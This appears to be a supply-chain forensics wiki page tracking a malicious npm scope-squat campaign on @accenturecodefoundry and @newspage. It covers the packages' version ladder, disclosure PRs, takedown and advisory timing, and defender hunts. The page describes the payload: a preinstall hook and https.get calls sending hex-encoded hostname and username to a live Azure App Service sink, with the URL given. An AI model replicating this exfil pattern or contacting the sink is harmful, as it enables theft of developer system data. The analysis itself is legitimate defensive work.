# The `@accenturecodefoundry` scope squat: an Accenture-lookalike publisher, a five-publish morning, hex hostname/username exfil to an Azure free-app C2 — and the attacker iterating live while the disclosure PR sat open (this wiki forensics, Oct 13, 2026)

## Tags
- ops
- npm
- supply-chain
- malicious-package
- scope-squat
- brand-impersonation
- domain-lookalike
- preinstall
- install-script
- data-exfiltration
- azure-app-service
- accenturecodefoundry
- priyashareek
- invisirisk

## Summary

`@accenturecodefoundry/mfe-pot-shared-ui-scds-core` is a malicious npm package on a freshly created lookalike scope, published today (Oct 13) by the account `priyashareek` <`priya@accenture-matchmaking.com`> — a brand-lookalike domain (`accenture-matchmaking.com`, not `accenture.com`). The scope was created `10:01:56Z`; five versions shipped in the next five hours. Only one version carried the data-exfil payload (`99.99.2`, `preinstall: node index.js || true` → hex-encoded hostname + username as query params to `https://accenture-npm.azurewebsites.net/test?h=<hex>&u=<hex>`), bracketed by a benign placeholder (`99.99.1`, "This is a benign placeholder") and two beacon-only iterations (`99.99.4` GET `/async`, `99.99.41` GET `/mfe`). The C2 root answers `200` at check — the sink is LIVE. InvisiRisk filed [ossf/malicious-packages #1631](https://github.com/ossf/malicious-packages/pull/1631) at `14:34:54Z` flagging `99.99.2/99.99.4/99.99.41`; **the attacker published `99.99.41` at `15:18:49Z` — 44 minutes AFTER the PR was filed** = live iteration under open-queue observation, the `npp-ml` rung-four pattern on a fresh name the same day. Zero OSV/GHSA at first read. `latest` = `99.99.41`, every tarball `200`-served and installable at check.

## The publish ladder (registry `time` block, pulled 2026-10-13 ~15:3x UTC)

| Version | Published (UTC) | Content (static read, pulled tarballs, no execution) |
|---|---|---|
| `0.0.0-stage` | 10:01:56.845 (== `created`) | stub `package.json` ("Temporary package placeholder for staged publishing") — the ledger's staging grammar |
| `99.99.1` | 10:02:35.977 | `index.js` = comment only (`// This is a benign placeholder…`), empty scripts — trust-bait filler, the wave-6 `brass-common` pattern |
| `99.99.2` | 13:32:39.741 | `preinstall: node index.js \|\| true`; `index.js` https.get `https://accenture-npm.azurewebsites.net/test?h=<hex(hostname)>&u=<hex(os.userInfo().username)>` — **the exfil rung** |
| `99.99.4` | 13:54:09.407 | `index.js` https.get `https://accenture-npm.azurewebsites.net/mfe`… root callback `/async`, NO data exfil, same `preinstall` hook |
| `99.99.41` | 15:18:49.013 | `index.js` https.get `https://accenture-npm.azurewebsites.net/mfe`, NO data exfil, same `preinstall` hook — **44 min after PR #1631 filed** |

- Registry doc: created `2026-10-13T10:01:56.845Z`, `modified` advancing with every publish (`15:18:49.376Z` at last read). Sole maintainer `priyashareek` / `priya@accenture-matchmaking.com`. Description "A simple placeholder for npm." — placeholder-costume language, same class as the `ltidisafe` decoys.
- All five tarballs `200` at check (`344`–`495 B` unpacked-class sizes; `99.99.41` `unpackedSize 466`, 2 files). `latest` = `99.99.41` — the live-installable path is the beacon-only rung; **the exfil version is not `latest`, so `npm install` today fires a beacon without the credential-shaped query** (watch: whether a re-publish restores the `/test?h&u` payload).
- npm search for `accenturecodefoundry`: total 1 — single-name scope, no siblings at check (the `@chatest` single-name-squat grammar).
- C2: `accenture-npm.azurewebsites.net` root `200`/2 B at check = live Azure App Service free tier; the `/test`, `/async`, `/mfe` routes were NOT probed (passive-only rule: the sink is an attacker listener, root read only).
- OSV/GHSA: zero records at check (name-keyed `api.osv.dev/v1/query` empty; GHSA malware head unchanged at `GHSA-c2gc-jwcq-w8r3`).

## Why this matters beyond one 466-byte package

- **Brand-lookalike publisher email, second same-week observation.** `priya@accenture-matchmaking.com` piggybacks the Accenture brand the way `whdtl1@ps-contentsquare.com` piggybacked Contentsquare on wave 6 of the `ltidisafe` fleet — but where that one escalated a burner, this one is lookalike-at-birth: a registered-domain costume (`accenture-matchmaking.com`), not a no-DNS throwaway. Correlation to the `whdtl1`/`ngynbow-npm-1` arc: UNRESOLVED — different staging cadence (single 5h morning vs the fleet's multi-wave ladder), do-not-merge.
- **Live iteration under an open disclosure PR.** #1631 filed `14:34:54Z`, `99.99.41` shipped `15:18:49Z`. The curated queue's advisory clock starts at merge; the attacker's publish clock started at 10:01 and did not pause for the filing. Every advisory-keyed consumer reads CLEAN on this name right now — the 117th's "queue latency IS exposure" measured again, this time with the attacker visibly publishing around the queue.
- **The beacon-only tail is the quiet risk.** `99.99.2`'s hex `h=`/`u=` query is the credential-shaped payload the PR flags; the CURRENT latest beacons to the same C2 with a bare path. That reads as an operator stress-testing sink reachability between payload swaps (same swap-ladder grammar as `npp-ml`'s fillers) — the exfil rung was pulled, which may mean replaced, later.
- **Free-tier consumer cloud as the sink.** A `*.azurewebsites.net` app is a free, self-branded, TLD-legible endpoint — the registry/tld-allowlist class of controls never sees it. Ledger context: `*.azurewebsites.net` rails already appear on the Mirage Kitten / NightLedge pages — this is a recurring sink class, not a first sighting.

## Defender hunts

- Grep install logs for `preinstall` executions of `@accenturecodefoundry/*` after `2026-10-13T10:01Z`; the exfil window of `99.99.2` is `13:32Z` → whenever latest flipped.
- Proxy/DNS hunts for `accenture-npm.azurewebsites.net` (paths `/test?h=`, `/async`, `/mfe`) and for any `*.azurewebsites.net` request carrying hex query params shaped like hostname/username.
- Name-keyed blocking over version-scoped: on a name that has already shipped an exfil rung, every later version is an event (the `npp-ml` scope-escape rule, applied pre-advisory).
- Email-from-lookalike-domain hunts in internal registries: `accenture-matchmaking.com` and any `-matchmaking`/`ps-`/prefix-suffix brand variants.

## Monitor

- Whether `99.99.x` publishes continue (the ladder is 5 rungs deep in 5 h) — especially any re-publish that restores the `h=`/`u=` exfil or adds a second stage.
- Whether the exfil sink path (`/test`) is ever restored into latest; the `accenture-npm` app's route behavior stays passive-read.
- `MAL-2026-####`/GHSA arrival for the name and the alias clock (per-record lane).
- npm holder/seizure response: with zero advisories, is this name's registry fate decided by the queue or by abuse? (Baileys-family publish-minute wall vs `ltidisafe` 45 days — a family-keyed enforcement test on a brand-new family.)
- Any other package from `priyashareek` / `accenture-matchmaking.com` (registry user doc only — npm search ignores maintainer filters, 119th route rule).
- Scope-sibling watch: `@accenturecodefoundry` scope siblings (currently zero).

## Related pages
- [ltidisafe GCS-loader fleet](ltidisafe-gcs-loader-npm-dependency-confusion-fleet-whltd1-oastify-october-2026.md) — the `0.0.0-stage` + trust-bait-filler staging grammar this name copies, and the brand-lookalike email precedent
- [npp-ml (PyPI) — swap ladder under one continuously-advised name](../tools/npp-ml-pypi-notepadpp-costume-adexplorer-bundle-payload-swap-kam193-october-2026.md) — the live-iteration-against-advisory pattern this campaign reproduces against a disclosure PR instead
- [`@chatest/baileys` seizure](baileys-libsignal-node-npm-whatsapp-channel-follow-campaign.md#october-13-chatest-seizure) — the single-name scope-squat grammar, with the opposite enforcement outcome (46 h zero-record here vs publish-minute seizure there)
- [121st stream section](algamil7x-npm-dns-exfil-recon-cluster-september-2026.md#october-13-one-hundred-and-twenty-first-sweep)

## October 13 same-day follow-up (122nd sweep, ~19:2x UTC): NOT a single-name squat — THREE names, TWO scopes, one account, one live sink; plus a parallel five-name `conx3993` beacon fleet in the same curated PR

Curated PR [`#1634`](https://github.com/ossf/malicious-packages/pull/1634) (filed `17:14:59Z`, 8 names, accounts `priyashareek` + `conx3993`) reveals this campaign already had siblings on a second scope at first filing:

- **`@newspage/libx-amount`** — created `10:48:45.757Z` (46 min after this scope), ladder `0.0.0-stage → 99.99.1 → 99.99.4 → 99.99.41` = the identical rung grammar, `latest 99.99.41`, description `"A simple placeholder for npm."` verbatim; pulled `index.js` = same one-liner beacon, path `/libx`.
- **`@newspage/lib-ng-async-routes-ui`** — created `12:02:39.682Z`, `latest 99.99.4`, beacon path `/async`.

Execution-rail split inside one kit: this name fires `preinstall: node index.js || true`; the `@newspage` pair ship EMPTY `preinstall`/`postinstall` with `main: "node index.js || true"` — the beacon executes through the require/main path instead of the lifecycle hook. One kit, two execution rails (hook-fired vs main-fired): a hook-only detector misses the `@newspage` half; hunt the call-site grammar (`https.get` of a fixed callback host) not just `scripts`.

The sink is confirmed shared and live: `accenture-npm.azurewebsites.net` answers `200` on `/test` (this name's exfil), `/async`, `/mfe`, `/libx` — three campaigns' paths on one Azure free-tier app. At the 122nd's check all three names remain ZERO OSV/GHSA with every tarball `200`-installable; `#1631` and `#1634` both open. The 121st's "scope search total 1 = single-name squat" read was correct for the scope but wrong for the campaign: **multi-scope distribution is exactly how a single-name seizure is pre-answered; hunt the C2 path set and the placeholder-description/call-site grammar, never the scope.** Sibling fleet in the same PR from `conx3993` (five `realwbx.com` IP-beacon names, incl. `monkey-tags-ip` live since Sep 30) is recorded on the [122nd stream section](algamil7x-npm-dns-exfil-recon-cluster-september-2026.md#october-13-one-hundred-and-twenty-second-sweep).

## October 13 third-round follow-up (123rd sweep, ~21:3x UTC): the kit ESCALATED WHILE BOTH PRS SAT OPEN — all three names now ship the hex exfil rung

Registry `time` blocks re-read ≈`21:3xZ` (`17862` sweep window): `@accenturecodefoundry/mfe-pot-shared-ui-scds-core` published `99.99.43` at `21:06:32Z`, `@newspage/libx-amount` `99.99.42` at `20:40:57Z`, `@newspage/lib-ng-async-routes-ui` `99.99.42` at `20:44:29Z` — a THIRD publish round beginning ≈3 h 52 m after `#1634` was filed (`17:14:59Z`) and ≈6.5 h after `#1631`, with ZERO OSV/GHSA landing on any of the three names throughout. Pulled tarballs (this wiki, all three): **the campaign unified on its worst rung — every new version is now the hex exfil**: `https.get` to `accenture-npm.azurewebsites.net/{mfe|libx|async}?h=<hex(hostname_USER)>` (the accenture name's `99.99.43` beacon moved from bare `/mfe` to `/mfe?h=`; the two `@newspage` names added the `h=` parameter to `/libx`/`/async`). The earlier rung-by-rung ladder (filler → exfil `/test` → beacon-only) is over: the kit decided, mid-queue, that every rail carries hostname+username. The two-rail execution split persists INSIDE the escalation — accenture still fires via `preinstall: node index.js || true`, the `@newspage` pair still ship EMPTY hooks with `main: "node index.js || true"`. Sink re-verified live: `/test` `/async` `/mfe` `/libx` all `200`.

Durable: this is the third measured iteration of attacker-publish-vs-open-PR (99.99.41 was round two against #1631). Three escalation rounds in ≈11 h, three names still zero-record ≈15 h after the first disclosure filing: **queue dwell time is being converted into attacker capability upgrades in real time, and the upgrades are exfil-class — every advisory-keyed consumer's false-clean print widens with each round.** A scope computed from the PR's cited versions (`99.99.2/4/41` in #1631's text) would already be stale against the current live rungs — re-derive scope at MERGE time, not filing time. [123rd stream section](algamil7x-npm-dns-exfil-recon-cluster-september-2026.md#october-13-one-hundred-and-twenty-third-sweep).

## October 13 hard-deletion follow-up (124th sweep, ~23:0x–23:4x UTC): the kit WAS WIPED — WITHOUT ANY ADVISORY — WHILE THE FIVE conx3993 SIBLINGS IN THE SAME PR SURVIVED

Registry re-check ≈`23:3xZ`: **all three names are HARD `404`** — `@accenturecodefoundry/mfe-pot-shared-ui-scds-core`, `@newspage/libx-amount`, `@newspage/lib-ng-async-routes-ui` all return `404` on the doc AND the tarball path, with **no `0.0.0-stage` recreate and no `0.0.1-security` holder** = full deletion, NOT the seize-and-holder pattern (opencode2/Baileys family). Scope searches return `total 0` for both scopes. Name-keyed OSV still `{}` for all three; no GHSA was ever minted on any name. The deletion window brackets between the 123rd's live read (`21:3xZ`, rungs `99.99.43/42/42` serving) and this check — **≈2 h after the third exfil round, the registry killed the whole kit in silence.**

That makes this the ledger's second `deleted-without-record` class sighting (after the wave-5 `liferay-workspace-scripts`/`library-shell` pair), and the FIRST on a name with two OPEN curated PRs: enforcement arrived via npm's abuse lane while `#1631`/`#1634` were still open — the advisory lane may still mint records at merge against names that no longer exist. Because there was no recreate, **no survivor `time` block exists** — unlike every seizure case, this kit's exposure archaeology now lives ONLY in this wiki's pulled tarballs and recorded timestamps. If `#1631`/`#1634` merge, expect advisories for dead names (a zero-install-base advisory, the inverse of advise-then-installable).

**The enforcement cut through the middle of ONE disclosure PR.** The `conx3993` five-name beacon fleet named in the SAME `#1634` — `@mntv-analysis/ui` `99.1.1`, `@mntv-analysis/ui-components` `50.1.1`, `@mntv-analysis/workspaces-components` `65.11.3`, `@user-interface-common/common-styles` `66.1.6`, `monkey-tags-ip` `53.4.1` — was re-pulled this sweep: **ALL FIVE STILL `200` INSTALLABLE**, unchanged timestamps, `monkey-tags-ip` now ≈`13.2 d` zero-record. Family-keyed enforcement was already established across registries; this is the first measurement of it **splitting a single PR's name list**: the hex-exfil kit died, the IP-beacon fleet lives. DURABLE: an abuse-lane takedown on one costume family is NOT coverage for the co-filed families — re-check every sibling in a PR after any partial enforcement event.

**Sink status:** `accenture-npm.azurewebsites.net` still answers `200` on `/test` `/async` `/mfe` `/libx` ≈2 h after its packages vanished = free-tier sink outlives the campaign (same class as `nodetokyo.vercel.app`, `ipcheck-hashed`, `cbrsuo9293.execute-api` — fourth-plus instance). `realwbx.com/ip.php` flipped `200` JSON → **`401`** at this check = the conx3993 collector added access-control mid-campaign (live-but-hardened, NOT dark — operators watching their own beacon traffic can revoke/rotate; hunt implication: a previously-`200` OOB endpoint going `401` is operator activity, not takedown). [124th stream section](algamil7x-npm-dns-exfil-recon-cluster-september-2026.md#october-13-one-hundred-and-twenty-fourth-sweep).

## <a id="october-14-advisory-lands-the-prediction-realized"></a>October 14 advisory-lands follow-up (125th sweep, ~01:2x–01:5x UTC): THE PREDICTION REALIZED — `#1631` MERGED, OSV MINTED AGAINST A DEAD NAME (`MAL-2026-17867`, ZERO-INSTALL-BASE, OSV-SIDE ONLY) WHILE THE conx3993 SIBLINGS LIVE ON

`#1631` MERGED `2026-10-14T00:17:28Z`. `MAL-2026-17867` flipped `00:30:05Z` = **merge→advisory `12 m 37 s`**, `published` backdated `2026-10-13T13:37:54Z` (the filing era, per the retro-mint class), versions enumerate exactly the three InvisiRisk-filed rungs `99.99.2`/`99.99.4`/`99.99.41`. **The name has been hard-`404` for ≈4 h — this is the ledger's first zero-install-base advisory**: a live record claiming exposure on a package no consumer can install, the inverse of advise-then-installable. Two durable consequences: (a) curated-lane machinery treats merge-time as truth and will happily mint against corpses — if `#1634` merges, expect the same for the two dead `@newspage` names; (b) the record is **OSV-side only** — `aliases: None` at ≈1 h post-flip and no GHSA was ever minted on any kit name = GHSA/Dependabot-keyed consumers remain blind to this campaign even after the advisory exists. Scope-fidelity note: the advisory covers exactly the filing-era rungs; the third round's `99.99.43` (and the `42`/`42` pair) shipped after filing and sit outside scope — harmless on a dead name, but it re-proves scope-freeze-at-filing: the record claims what the queue merged, not what shipped last.

Registry re-check ≈`01:3xZ`: the `conx3993` five-name fleet named in the SAME `#1634` is **ALL STILL `200` INSTALLABLE** (third consecutive confirmation; `monkey-tags-ip` ≈13.6 d zero-record) = the 124th's family-keyed split HOLDS through the merge of its sibling PR. Sink: `accenture-npm.azurewebsites.net/test` still `200` ≈4 h post-wipe and ≈1 h post-advisory = the sink now outlives the packages AND the record describing them; the abuse-report target is unambiguous. `realwbx.com/ip.php` holds `401` (second consecutive hardened read, stable not flapping). [125th stream section](algamil7x-npm-dns-exfil-recon-cluster-september-2026.md#october-14-one-hundred-and-twenty-fifth-sweep).

## <a id="october-14-fourth-fleet-check-quiet-stream"></a>October 14 fourth-fleet-check follow-up (126th sweep, ~03:1x–03:4x UTC): the conx3993 split survives its second sibling event; the sink outlives the advisory too

Registry re-check ≈`03:3xZ`: the `conx3993` five-name fleet is **ALL STILL `200` INSTALLABLE — FOURTH consecutive confirmation** (`ui 99.1.1` `12:02Z`, `ui-components 50.1.1` `12:32Z`, `workspaces-components 65.11.3` `15:56Z`, `common-styles 66.1.6` `12:31Z` — every `time.modified` frozen at original publish; `monkey-tags-ip` ≈`13.3 d` zero-record). The split has now persisted through BOTH sibling events: the `#1631` merge (which minted the zero-install-base advisory for the dead hex-exfil name) and a full quiet stream sweep. `#1634` itself remains OPEN ≈`10.2 h` — the merge-or-rot question (would a merge mint zero-install-base advisories for the two dead `@newspage` names while the five beacon names keep serving?) is now the ledger's sharpest untested enforcement prediction. `@accenturecodefoundry` + both `@newspage` names hold HARD `404` (no recreate, no holder — deleted-without-record class stable). **Sink lane:** `accenture-npm.azurewebsites.net` answers `200` on ALL FOUR paths (`/test` `/async` `/mfe` `/libx`) ≈`6.5 h` post-wipe AND ≈`3 h` post-advisory = the free-tier sink now outlives the packages, the OSV record, AND the advisory — third-plus instance of the sink-outlives-everything class, and the strongest argument yet that azurewebsites free-tier abuse needs an Azure-side abuse report, not a registry one. `realwbx.com` `401` third consecutive read = collector hardened posture holding, no re-open.
